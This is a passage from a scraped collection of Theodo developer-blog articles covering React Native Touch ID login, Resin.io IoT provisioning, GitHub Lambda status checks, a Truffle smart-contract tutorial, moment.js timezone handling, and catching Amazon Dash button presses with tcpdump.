passcode?\nThe simplest solution is the one used by Dropbox: Users are logged out if they enter a wrong passcode 10 times in a row.\nTouch ID Login: Make your app more user-friendly\nAnother popular use of Touch ID is the Touch ID login.\n\nUsers are prompted to authenticate with their fingerprint, and if authentication is successful, they get logged into the app.\nThis use case makes most sense if your users do not remain signed in and have to log in every time they open the app.\nTherefore, you see this often being used in banking apps.\nImplementing the Touch ID Login\nThere are three steps to implementing the Touch ID Login:\n\nStore the user\u2019s login credentials on the device\nPrompt the user to authenticate with Touch ID on the login screen\nIf Touch ID authentication is successful, use the stored credentials to perform the login call behind the scenes\n\nFirst time users will have to manually sign into the app.\nDuring the initial sign in, you can store the user\u2019s credentials in the secure storage of the device.\nAgain, do not use React-Native\u2019s built-in Async Storage.\nThis is even more critical for the Touch ID login because it would be storing the user\u2019s password in cleartext.\nTo store the user\u2019s credentials securely, you should use react-native-keychain.\nFirst, you need to install it:\nyarn add react-native-keychain            # Install the JS package\r\nreact-native link react-native-keychain   # Link the library\r\n\nYou can then store the credentials in the keychain when the user logs in:\nimport * as Keychain from 'react-native-keychain';\r\nimport { login } from './api';\r\n\r\n// Submission handler of the login form\r\nhandleSubmit = () => {\r\n  const {\r\n    username,               // Get the credentials entered by the user\r\n    password,               // (We're assuming you are using controlled form inputs here)\r\n    shouldEnableTouchID,    // Did you ask the user if they want to enable Touch ID login ?\r\n  } = this.state;\r\n\r\n  login(username, password) // call the `login` api\r\n    .then(() => {\r\n      if (shouldEnableTouchID) {\r\n        // if login is successful and users want to enable Touch ID login\r\n        Keychain.setGenericPassword(username, password); // store the credentials in the keychain\r\n      }\r\n    });\r\n};\r\n\nNext time the user lands on the login screen, you can present them with the Touch ID authentication prompt.\nFor example, you could add a button on the login form that allows users to login via Touch ID.\n\nIf the fingerprint authentication is successful, you can retrieve the credentials from the keychain and use them to make the login request.\nThe actual Touch ID login will look similar to this:\nimport * as Keychain from 'react-native-keychain';\r\nimport { login } from './api';\r\n\r\nhandlePress = () => {              // User presses the \"Login using Touch ID\" button\r\n\r\n  Keychain.getGenericPassword()   // Retrieve the credentials from the keychain\r\n    .then(credentials => {\r\n      const { username, password } = credentials;\r\n\r\n      // Prompt the user to authenticate with Touch ID.\r\n      // You can display the username in the prompt\r\n      TouchID.authenticate(`to login with username \"${username}\"`)   \r\n        .then(() => {\r\n\r\n          // If Touch ID authentication is successful, call the `login` api\r\n          login(username, password)\r\n            .then(() => {\r\n              // Handle login success\r\n            })\r\n            .catch(error => {\r\n              if (error === 'INVALID_CREDENTIALS') {\r\n                // The keychain contained invalid credentials :(\r\n                // We need to clear the keychain and the user will have to sign in manually\r\n                Keychain.resetGenericPassword();\r\n              }\r\n            })\r\n        });\r\n    });\r\n};\r\n\nHandling Invalid Credentials\nUnlike the Touch ID Lock, you do not need to worry about implementing a fallback for the Touch ID Login, since you can just use the manual sign in.\nHowever, you do need to worry about making sure that the keychain never contains invalid credentials.\nOtherwise, your user might keep retrying to login via Touch ID using the wrong credentials.\nIn the worst case, you may end up disabling your user\u2019s account due to too many failed login attempts.\nUnfortunately, there is no guarantee that your keychain will always contain valid credentials.\nSometimes, users change or reset their credentials.\nAnd if the username or password is changed on a different device, your keychain will end up containing invalid credentials.\nIf you realise that the keychain does contain invalid credentials, you must clear the keychain and turn off Touch ID.\nTo clear the keychain, call the Keychain.resetGenericPassword() function.\nThis means that your user will have to sign in manually.\nHowever, once the manual login is successful, you can directly update the keychain with the provided credentials and the next login will quick and painless thanks to the Touch ID.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBrian Azizi\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAn IOT Container Engine\nWhen preparing a company-wide IOT(Internet of Things) hackathon I wanted to ensure all the Raspberry Pi devices we planned to use were ready for people to throw code at without needing monitors, keyboards, setting up ssh keys and getting frustrated by time wasted to getting to hello world.\nI thought, we must have got further than this by now, with AWS I can spin up a complete load balanced server anywhere in the world in a matter of minutes\u2026\nAnd we have got further\u2026\nResin.io brings simplicity to one of the most challenging and for me boring aspects of IOT; provision of devices. More than simplifying life for developers who want to build awesome products, it provides the tools to deal with real life IOT applications at scale.\u00a0 \u2013 For example fleet wide deployments ready at the click of a button.\nSo let\u2019s get to Hello World.\nGo to resin.io and sign up for free.\nCreate a new application, selecting the IOT device you want to use (note this does not seem to be editable later), in our case a Raspberry Pi 3.\n\nNow click, add a device, keep the defaults and click download the OS.\n\nWhile that\u2019s downloading, install etcher.io. Etcher. An open source\u00a0tool from resin.io that allows you to easily burn images.\nNow plug in your SD card, open Etcher and select the file you downloaded for the SD card you just plugged in and wait\u2026\nWhile your waiting let\u2019s make an ssh key for our resin account:\nssh-keygen -t rsa -b 4096 -C \u201cYOUR_EMAIL_ADDRESS\u201d\nGive a file name at the prompt.\nNow copy the ssh public key: pbcopy < ~/.ssh/id_rsa_theodo_pi.pub \nGo onto the dashboard and click add manual ssh key (or you could import keys from GitHub, but that feels weird to me!)\nNow, back to the main event!\nGo back to the resin.io dashboard and refresh.\n\nYou should now see your device!\nClick on the device and you can open the logs and console of the device or docker container inside.\nNow let\u2019s say hello\nResin provide a simple hello world boilerplate for the PI3 so lets clone:\ngit clone https://github.com/resin-io-projects/simple-server-node.git\nWe can now cd into this and add a remote directory as shown in the top right of the dashboard:\u00a0git remote add resin USERNAME@git.resin.io:USERNAME/APPNAME.git\nThe first push will take some time (5 min), but docker container sharing will speed this up next time.\n\u00a0\nAlso, the completion mascot is awesome!\nNow, got to the IP address of your device in your browser and see the amazing words \u201cHello World!\u201d.\nNote: Depending on the config you used you could have set public HTTP forwarding for this device. This is a great feature but depending on your network could be a vulnerability to your home/office and I\u00a0advise you close this unless you need it. You can turn this off in the actions section of the dashboard.\nLet\u2019s get personal\n\u00a0\nHello\u00a0world is great, but I prefer to be called by name. So time to push an update.\nEdit the server.js file to say \u201cHello Ben\u201d (or your name if you prefer).\nAgain, git push resin master and you\u2019ll have your update in no time.\n\u00a0\nSo this is way easier than it used to be, but if it\u2019s still to slow a feedback loop for you how about hot reloading of your local code to one of your fleet devices?\nResin Sync to the rescue https://docs.resin.io/tools/cli/#sync-uuid-\nIn Conclusion:\nResin can takes the headache out of basic IOT provisioning.\nAt scale, it can allow a whole fleet of devices to be provisioned, updated, managed and debugged.\nThe use of docker allows a consistent build process across projects and fast deployments.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBen Ellerby\r\n  \t\t\t\r\n  \t\t\t\tI'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. \r\n\r\nI'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.\r\n\r\nhttps://www.linkedin.com/in/benjaminellerby/  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\"Can't you name all your pull requests in the right format?\"\r\n\n\"...Oops I just merged into production\"\r\n\nUsing AWS lambdas can be a cool and useful way to improve your workflow with GitHub.\nBlocking merges when tests fail on your branch is common, but GitHub status checks can be pushed much further.\nCombining GitHub\u2019s API and Lambdas provides this opportunity.\nStatus Checks\nTurns out we can use a Github Webhook Listener to POST to an AWS lambda after any specified events(pushes, commits, forks, pull requests etc).\nIn response, lambdas can in turn POST back to a Pull Request and create/update a status check.\nOr they can just POST at specified times.\nTo test this out and get it up and running, we could impose two checks:\n\nA required format for pull request titles\nSpecific times where merging to production is prohibited\n\nFor a full in-depth guide on setting all this up for your project see my github-lambda-status-checks repo.\nEvent Listener\nFirst we set up a lambda which can react to a JSON of information about a pull request.\nAfter deploying the lambda via serverless we are given an endpoint which, using GitHub webhooks, can automatically be hit on every pull request action(create, edit, \u2026)\nThe webhook provides the lambda with a large amount of information about the PR.\nAn abridged version of some of the information sent to the lambda is shown below:\nAbridged GitHub Status Post\nAmongst this, we are given a statuses_url to which we can send a POST request back to the GitHub API to create/update a status.\nFor example, sending the following created the fake CI status in the title image:\nSuccess GitHub Status\nWe can add any logic based on say, the pull request title, to send back a status result (\u2018success\u2019, \u2018failure\u2019, \u2018pending\u2019).\nPost GitHub Status\nThese will appear, as in the title image, depending on the state sent.\nIn github-lambda-status-checks you can add any logic to gitWebhookListener.js from line 78 to tweak your status responses.\nAfter any status check(which are unique by their context) has run at least once in a repo, it can be chosen as a Required status check on any protected branches(settings -> branches).\nThis will prevent the PR being merged unless the status check has a success state (see title image).\nCron Job\nLambdas can also be setup to trigger at set times in the day.\nUsing the GitHub API the lambda can say, GET all the pull requests from a given repo merging into the production branch.\nAt 4pm it could then send a pending state to all of these pull requests. If this check is set as Required, it would then block accidental merging at inappropriate times.\nYou could then trigger another lambda at 8am to unblock all these PRs.\nGotcha\nIf you set this status to \u2018Required\u2019 then any new pull request can not be merged until it passes this check, which won\u2019t be until 8am the next day\u2026\nTo overcome this you can check the time in the pull request event listener so that any new pull request can pass/fail the time check as expected.\nWhat we did\nWe wanted to move a long running project from merging to production twice a week, to continuously deploying with every ticket.\nThe lambdas in this article came about to address some concerns we had about this.\nTitle Checker\nOur release notes (linked directly to pull request titles) needed to accurately reflect what was in production at a given time (as opposed to random commit titles).\nDevs/stakeholders needed to be able to quickly associate a pull request title to a team, ticket number and user story:\n(A-TEAM 123) AAC I love this product\r\n\nThis was implemented similar to gitWebhookListener.js with simple JS/regex.\nTime Checker\nOur team had become accustomed to merging a validated ticket to a master branch.\nThis master branch would then be merged/deployed into production twice a week.\nThe worry with continuous deployment (eliminating master) was that a ticket may accidentally be merged to production (after validation) too late in the day (when bugs can\u2019t be monitored/fixed).\nThus the timed lambda in githubTimeStatus.js (and the gotcha in githubWebhookListener.js) was implemented.\nFurther Applications\nAs we have seen, the response from GitHub provides a lot of information about the PR, so you could adapt this to any need you may have.\nReferences\nFor a full in-depth guide on setting this up for your project see mygithub-lambda-status-checks repo.\nLinks\n\nGitHub webhook listner Source\nSupport for ES6/ES7 Javascript\nServerless\nGitHub API for statuses\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tRob Cronin\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tUnderstanding the concepts behind a blockchain is not as hard as one could imagine.\nOf course some specific concepts of a blockchain environment are harder to understand (e.g. mining) but I will try first to give you a simple introduction to the most important concept of blockchain.\nThen we will write a first smart contract inside a blockchain.\nThat will be the first step before trying to build a decentralized web application implementing smart contracts!\nBasically a blockchain is a chain of block, more precisely a linked chain of blocks.\n\nA block is one element of a blockchain and each block has a common structure.\nThe security of a blockchain is assured by its decentralized nature.\nUnlike a classic database, a copy of the blockchain is stored in each node of its peer-to-peer network.\nIn the case where the local version of a blockchain in a networks node were corrupted, all the other nodes of the P2P network would still be able to agree on the actual value of the blockchain: thats the consensus.\nIn order to add a fraudulous transaction to a blockchain, one should be able to hack half of the user of the network.\nFurthermore, it is also very hard to alter even only a local version of a blockchain because of a block structure.\nBlock structure\nWhat is interesting in the concept of blockchain is that we can store any kind of data with very high security. Data is stored inside a block that contains several elements:\n\nA hash\nThe hash of the previous block\nAn index (number of the block in the chain)\nA nonce (an integer that will be used during the mining process)\nA timestamp\nThe data\nA hash representing the data\n\nIf you are not familiar with the concept of hash, the important things to know are:\n\nFrom a very large departure set (typically infinite and very diverse), a hash function gives back a string of fixed length\nThe hash of a block is easy to calculate\nGiven a hash, it is impossible to build a message with this hash value\nIf you modify the message (even very slightly), you totally change the hash\nIt is almost impossible to find two messages with equal hash\n\nThe hash of a block is calculated by taking as argument the hash of the previous block, the index, the nonce, the timestamp, and a hash representing the data of the current block.\nAmong these inputs, the nonce will vary during the process of mining but of course the others stay fixed.\nBecause of the properties of a block, if you try to change the transactions/data inside a block, its hash will not be consistent with the data anymore (neither will be the previous hash of the next block).\nMining a block\nWhen a block is created, nodes of the network will try to mine it, which means to insert it into the blockchain.\nThe miner who succeeds will get a reward.\nProof of work\nIn order to mine a block, you have to find a valid hash for this block, but as you may remember a hash is quite easy to calculate.\nThats why you need to add a condition on the desired hash, typically a fixed number of zeros the hash must start with.\nThe proof-of-work enhances blockchain\u2019s security because of the considerable amount of calculation needed to modify a single block.\nTo conclude, a miner has to solve a time consuming mathematical problem to mine a block.\nThe nonce\nA nonce is an integer which will be incremented during the mining process.\nWithout a nonce, the data of a block is constant, and thus the hash function always returns the same result.\nIf your hash consists of hexadecimal characters, and you want to have a hash starting with 5 zeros you will have a probability of 1/1048576 to produce a hash verifying this condition with a random nonce.\nEach time you fail to get a hash verifying the condition, you can update the nonce and try again.\nThis assures that the miners of the network will have to work to add a block to the blockchain and thats why this algorithm is called proof of work.\nSmart Contracts\nSmart contracts have been introduced in the ethereum blockchain.\nThis is some code written inside the block of a blockchain that is able to execute a transaction if some conditions are fulfilled.\nIt is useful when the execution of a contract depends on some difficult conditions, or when you usually use a third-party to ensure the execution of the contract.\nInitializing the project\nIn this part we will write a smart contract using Solidity, the programming language used in the ethereum blockchain and Truffle; a development environment for Ethereum.\nWe will use Ganache (you can download it here which will give us access to a personal ethereum blockchain in order to test our smart-contracts and deploy them in a blockchain.\nFirst, lets install Truffle and initialize our project by running the following commands:\n\r\nnpm install -g truffle\r\nmkdir my-first-smart-contracts\r\ncd my-first-smart-contracts\r\ntruffle init\r\n\nThe truffle init command will provide the basic folders and files of your project:\n\ncontracts/\nmigrations/\ntest/\nbuild/\ntruffle.js\ntruffle-config.js\n\nYou can now open Ganache.\nYou will see 10 fake accounts that we can use and a local blockchain with only one initial block.\nYou can also see the port where your local blockchain runs. It should be by default HTTP://127.0.0.1:7545.\n\nLet\u2019s open your truffle.js file and modify it to connect it with the blockchain.\n\r\nmodule.exports = {\r\n    networks: {\r\n        development: {\r\n            host: 'localhost',\r\n            port: 7545,\r\n            network_id: '*'\r\n        }\r\n    }\r\n};\r\n\nOur first smart contract\nIn our contracts folder, we will create a basic smart contract Message.sol.\nIt will only enable us to write a message in the blockchain but it will be a good start to understand the way solidity works.\n\r\npragma solidity ^0.4.17;\r\n\r\ncontract Message {\r\n\r\n    bytes32 public message;\r\n\r\n    function setMessage(bytes32 newMessage) public {\r\n        message = newMessage;\r\n    }\r\n\r\n    function getMessage() public constant returns (bytes32) {\r\n        return message;\r\n    }\r\n}\r\n\nAs you can see, a contract looks like a regular class in another language.\nHowever, unlike a typical class, there is no this to access instance variables.\nThe state variables, like message here, can be read or written directly.\nSolidity is a typed language, you have to declare the types of the variables you create and specify the types of function arguments (like in setMessage) and returned values (like in getMessage)\nA call to setMessage will add a transaction to the blockchain and thus cost you gas because it modifies the state of the contract.\nGas is the amount you have to pay for running a transaction.\nThe miner can decide to increase or decrease the amount of gas according to its need.\nHowever you want to be able to access the value in the blockchain without spending gas, that\u2019s why we precise constant in getMessage declaration.\nYou may wonder why we used the type bytes32 and not string which exists in solidity.\nThe main reason is that writing to the ethereum blockchain costs ether.\nThe type string, being dynamically sized, is more expensive to use when writing data in the blockchain than the type bytes32.\nDeploying to the test blockchain\nOur contract being written, we now want to deploy it on the network.\nIn order to do this we have to write a migration file in javascript.\nIn the folder migrations/ let\u2019s create a new migration file called 2_message_migration.js.\nIt is important to write the \u20182\u2019 because Truffle will execute the migrations in the order of the prefix.\n\r\nvar Message = artifacts.require('./Message.sol');\r\nmodule.exports = function(deployer) {\r\n    deployer.deploy(Message);\r\n};\r\n\nThe artifacts.require method is similar to the require of node and will tell Truffle which contracts you want to interact with.\nThe name of the variable must match the name of your contract.\nThe deployer object gives you access to the deployment function.\nOur example is the easiest one.\nBack to the shell, we can now deploy our contract to the blockchain:\n\r\ntruffle compile\r\ntruffle migrate\r\n\nIn ganache you can now see new blocks automatically mined and corresponding to the deployment of your contract in your blockchain!\n\nInteracting with the contract\nThe contract being deployed on our local blockchain, we can now write our first transactions and see what happens.\nTo interact with the contract we can use directly the truffle console and write javascript in it or write a script and run it.\nIn this example we will interact directly in the console.\n\r\ntruffle console\r\nvar message;\r\nMessage.deployed().then(function(instance){message = instance;})\r\nmessage.setMessage(web3.fromAscii('Premier message !'));\r\n\nIf you go back to Ganache, you will see that a new block has been added to the blockchain, that\u2019s because setMessage is a transaction and modifies the state of our contract.\n\r\nmessage.getMessage().then(function(message){console.log(web3.toAscii(message));})\r\n\nFunctions from contract are promisified, that\u2019s why we use then to access the data. Moreover, as we used the type bytes32 to write our message, we have to add web3.fromAscii and web3.toAscii to write and read our message.\nThis last command should return the value of your message but if you look at your blocks in Ganache, you will not see any new blocks as this getter function did not modify the state of your contract.\nTesting a contract\nTruffle easily enables you to create tests for your contracts. It comes with its own assertion library which provides you classic test hooks beforeEach, afterEach, beforeAll, afterAll, and assertions equal, notEqual, isEmpty\u2026\n\r\nimport 'truffle/Assert.sol';\r\nimport 'truffle/DeployedAddresses.sol;\r\nimport '../contracts/Message.sol';\r\n\r\ncontract TestMessage {\r\n    function testSetMessage() {\r\n        Message messageContract = Message(DeployedAddresses.Message());\r\n        messageContract.setMessage('Hello World!');\r\n        bytes32 expected = bytes32('Hello World!');\r\n        Assert.equal(messageContract.getMessage(), expected, 'The message should be set');\r\n    }\r\n}\r\n\nThe contracts you deployed on the blockchain are available through the DeployedAddresses.sol library.\nIt is mandatory that your test contract and your test file start with \u2018Test\u2019, followed by the name of the contract.\nThe test being written you can now run it in the console:\n\r\ntruffle test\r\nUsing network 'development'.\r\n\r\nCompiling ./contracts/Message.sol...\r\nCompiling ./test/TestMessage.sol...\r\nCompiling truffle/Assert.sol...\r\nCompiling truffle/DeployedAddresses.sol...\r\nTestMessage\r\n\u2713 testSetMessage (55ms)\r\n\r\n1 passing (402ms)\r\n\nNext steps\nWe learnt how blockchain works and what a smart contract is but most importantly how to develop using the truffle environment thanks to a simple example.\nThe next step is to write one or more sophisticated contracts and build a web app to interact with them!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLouis Pinsard\r\n  \t\t\t\r\n  \t\t\t\tCurrently Web Developer at Theodo. Also very curious about AI, machine learning and blockchain.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHandling dates when dealing with timezones is a difficult task.\nFortunately for us, there are many libraries like moment.js helping us to handle common issues like timezones, daylight saving time, manipulation and date formatting.\nI recently encountered several issues in displaying dates in the correct format and timezone whilst working on a mobile application project.\nAn external server which sends us local date time as a string and timezone like this:\n\r\n{\r\n  localDateTime: 'YYYY-MM-DD HH:mm', // Not in UTC\r\n  timezone: 'Indian/Reunion', // Or 'Europe/Paris''\r\n}\r\n\nI had to display and manipulate these dates. But before that, I needed to parse and store them. To be more specific with the  about the use case is drawn above a diagram of the date flow in my application.\n\nIn this article, I will show you how to deal with common difficulties in date handling with one of the most standard libraries: moment.js.\nWhat is moment ?\nMoment is a very comprehensive and popular library for handling dates. It can be thought of as the standard in javascript. It provides functions to parse, manipulate and display dates and times. Moment-timezone.js adds functions to handle dates and times for different countries.\nOn the other hand, one should be aware that moment dates are mutable. I will deal with this issue in the manipulation part of this article.\nI will focus on explaining the flow of date handling in a full JS application. I will also shed light on some tricky points of moment.\nTime zone\nSo, what is a timezone?\nTime zone is a region of the globe that observes a uniform standard time which are offset from Coordinated Universal (UTC). A time zone sets the time according to the distance from the prime meridian. Some time zones change their offset during the year. This is called daylight saving time (DST).\nIn the map above, you can see the time in every part on the world corresponding to the timezone without DST.\n\nNote: There is no time difference between UTC and Greenwich Mean Time (GMT). But UTC is a standard time whereas GMT is a timezone.\nHow to store a date\nParse the date string\nWhen you receive a date string, you should first parse it to get the correct datetime before storing it in your database.\nAccording to the format\nMoment provides a function moment(date: string, format: string) to convert a string into a moment object according to the format. \n\r\nconst moment = require('moment')\r\n\r\nconst dateToStore = '2018-01-27 10:30'\r\nconst momentDate = moment(dateToStore,'YYYY-MM-DD HH:mm')\r\n// momentObject(2018-01-27T10:30:00.000)\r\n\nAccording to the timezone\nWe created a moment object which corresponds to the string. But let\u2019s see the result in our example with a server A in Reunion (UTC+04:00) and a server B in France (UTC+01:00). If A sends a string  2018-01-27 10:30 to B, A wants to share 2018-01-27 6:30+00:00, but B will understand 2018-01-27 9:30+00:00.\n\nBy default, moment parses the date with the machine local time (either the user or the server). You can get the local utcOffset in minutes with moment.utcOffset(). So if you don\u2019t specify the timezone, the date will not be correctly parsed. You had to specify it using moment-timezone instead of moment.\n\r\n const moment = require('moment')\r\n const momentTz = require('moment-timezone')\r\n\r\n const dateToStore = '2018-01-27 10:30'\r\n moment().utcOffset(); // 60 minutes\r\n const timeZone = 'Indian/Reunion' // 'UTC+04:00'\r\n\r\n const momentDate = moment(dateToStore,'YYYY-MM-DD HH:mm')\r\n //momentObject(2018-01-27T10:30:00+01:00)\r\n \r\n const momentDateTz = momentTz.tz(dateToStore,'YYYY-MM-DD HH:mm',timeZone)\r\n //momentObject(2018-01-27T10:30:00+04:00)\r\n\nBetter cases\nIn this case, the external API sends the date without any timezone and not in UTC. The best practice is to send the date in UTC or at least with the offset from UTC so that the receiver does not have to handle timezone. In these better cases, you can parse the date string using moment.utc() or moment.parseZone() or either moment(date,'YYYY-MM-DD HH:mm:ssZZ').\n\r\nconst moment = require('moment')\r\n\r\nconst receveidDateInUTC= '2018-01-27 6:30:00+00:00'\r\nconst receveidDateWithTimeZone = '2018-01-27 10:30:00+04:00'\r\n\r\nmoment(receveidDateInUTC,'YYYY-MM-DD HH:mm:ssZZ')\r\n// momentObject(2018-01-27T7:30:00+01:00)\r\n\r\nmoment.utc(receveidDateInUTC,'YYYY-MM-DD HH:mm:ssZZ')\r\n// momentObject(2018-01-27T6:30:00+00:00)\r\n\r\nmoment(receveidDateWithTimeZone,'YYYY-MM-DD HH:mm:ssZZ')\r\n// momentObject(2018-01-27T7:30:00+01:00)\r\n\r\nmoment.parseZone(receveidDateWithTimeZone,'YYYY-MM-DD HH:mm:ssZZ')\r\n// momentObject(2018-01-27T10:30:00+04:00)\r\n\nAs you can see, there are a number of ways to parse the same date.\nThat is why it is a best practice to store and send your date in UTC.\nUse Coordinated Universal Time (UTC)\nTo make the data portable I would recommend storing the datetime in UTC. It is the international time standard that expresses dates without offsets and does not adjust for daylight savings. To do this, I use the moment.utc()  function which converts a moment object in UTC.\n\r\nconst momentTz = require('moment-timezone')\r\n\r\nconst dateToStore = '2018-01-27 10:30'\r\nconst timeZone = 'Indian/Reunion' // 'UTC+04:00'\r\n\r\nconst momentDateTz = momentTz.tz(dateToStore,'YYYY-MM-DD HH:mm',timeZone)\r\n// momentObject(2018-01-27T10:30:00+04:00)\r\n\r\nconst momentDateTzUTC = momentTz.tz(dateToStore,'YYYY-MM-DD HH:mm',timeZone).utc()\r\n// momentObject(2018-01-27T06:30:00+00:00)\r\n\nFinally you can store the date as a TIMESTAMP_WITH_TIMEZONE attribute in your database.\nDisplay a date\nSet the local time\nI created a service in my application which provides a function to format dates. We received the date from our back-end in UTC. But depending on where the person is, the locals are not the same. The locals contain informations about linguistic, cultural, and technological conventions and standards. That is why the first thing to do is to set the local time. I got the local time with the library react-native-device-info and then I set the local time with moment.locale().\n\r\nconst moment = require('moment')\r\nconst DeviceInfo = require('react-native-device-info');\r\n\r\nconst date = '2018-01-27T10:30:00+00:00'\r\nmoment.locale() // 'fr'\r\nmoment(date).format('DD MMMM') // 27 Janvier\r\n\r\nconst local = DeviceInfo.getDeviceLocale() // 'en'\r\nmoment.locale(local)\r\n\r\nmoment(date).format('DD MMMM') // 27 January\r\n\nFormat the date\nFinally, I create one function for each format I had.\n\r\nconst plainTextDateTime = dateTime => {\r\nreturn moment(dateTime).format('DD MMMM HH:mm a') // 27 January 10:30 am\r\n}\r\nconst getDate = dateTime => {\r\nreturn moment(dateTime).format('DD MMMM') // 27 January\r\n}\r\nconst getTime = dateTime => {\r\nreturn moment(dateTime).format('HH:mm a') // 10:30 am\r\n}\r\n\nDate manipulation\nMoment provides a core of manipulating functions as comparison, addition and subtraction functions. It is really easy to use. The main issue is that moment objects are mutable.\nFor example, if you want to know if a date is in less than one hour, you have two options :\n\r\n//option 1\r\nconst myDate = moment('2018-01-27 10:30:00+00:00','YYYY-MM-DD HH:mm:ssZZ');\r\nif (myDate.isBefore(moment().add(1,'hour'))) {\r\n// myDate is less than one hour\r\n}\r\n\r\n//option 2\r\nconst now = moment();\r\nconst myDate = moment('2018-01-27 6:30:00+00:00','YYYY-MM-DD HH:mm:ssZZ');\r\nif (myDate.subtract(1,'hour').isBefore(now)) {\r\n// myDate is less than one hour\r\n}\r\nconsole.log(myDate.format())\r\n// myDate has been muted => 2018-01-27T05:30:00+00:00\r\n\nWith the first option, you add one hour to moment() which is not a problem because you don\u2019t keep this value in memory. But with the second option, the value of myDate has changed which is not what you expected. You need to clone the value of myDate before manipulating this value.\n\r\n//option 2\r\nconst myDate = moment('2018-01-27 6:30:00+00:00','YYYY-MM-DD HH:mm:ssZZ');\r\nif (myDate.clone().subtract(1,'hour').isBefore(moment())) {\r\n// myDate is less than one hour\r\n}\r\nconsole.log(myDate.format())\r\n// myDate has NOT been muted => 2018-01-27T06:30:00+00:00\r\n\nConclusion\nTo conclude, a date has four states for the same data:\n\nThe received state as a string: parse the date in order to have the correct moment object\nThe storage state: store your data in UTC or at least with the time zone (TIMESTAMP WITH TIME ZONE in postgreSql)\nThe manipulation state: manipulate your dates with date object. If you are using moment, clone the object before manipulating.\nThe displaying state: set the local time and create a service to handle the different representation in your application.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCl\u00e9ment Dufour\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA few years ago Amazon came out with the Amazon Dash Button, a small internet connected button that can be used to reorder common household items. Such a small, cheap and well-made internet connected button seems like a godsend for the IOT developer community \u2013 but they are not intended for use outside of product ordering. Amazon did release an IOT version of the Dash button, but at 4 times the price point it\u2019s less attractive.\nCould we intercept the network requests from Dash buttons and trigger our own custom events? An IOT doorbell, office coffee emergency button\u2026 That\u2019s the challenge we set ourselves.\nConnect the Dash Button to WiFi\nOpen up your Amazon app on IOS or Android, turn on Bluetooth and add the device. Be sure to quit the process once it\u2019s connected to the internet but before you select a specific product!\nNow your button is online.\nGetting the MAC address of the button\nThe Dash Button is asleep most of the time, meaning when you press the button it must connect to the LAN over WiFi and then send its API request. Therefore it needs to acquire an IP address.\nOn an IPv4 network, Dynamic Host Configuration Protocol (DHCP) is used to get an address, and this process includes an Address Resolution Protocol (ARP) request. Our plan is to place a Raspberry Pi device on the LAN to watch for such ARP requests from our Dash buttons, allowing us to then trigger actions.\nFrom our laptop on the same network, we can watch broadcast packets on the network using tcpdump.To watch for ARP request packets we can run:\n\r\ntcpdump -ve arp | awk '{print $2}\r\n\n(on Mac)\n\nthe -v option gives us a verbose output\nthe -e option displays the MAC addresses\nthe awk script prints out just the MAC address column.\n\nThere will likely be many busy devices cluttering up your network so run this, press the dash button, wait 30 seconds and then look at the list of MAC addresses captured.\nPart of the MAC address specification includes the manufacturers ID so we can go to an online tool such as macvendors.com and lookup each of the addresses we found. The one that has the manufacturer as Amazon Technologies Inc. is what you\u2019re looking for. Make a note of the address in question, and if you\u2019re looking to setup multiple devices use the same process.\nIf you have other Amazon devices on your network this process may take more trial and error.\nTriggering an action\nWe can write a short bash script, using a similar approach to above, that will trigger an action whenever the button is pressed.\n\r\n#!/bin/bash\r\nbutton='ENTER_THE_MAC_ADDRESS'\r\ntcpdump -l -n -i en0 | while read b; do\r\n  if echo $b | grep -q $button ; then\r\n    echo \"Trigger Action\"\r\n  fi\r\ndone\r\n\n\nbutton is the MAC address from the step 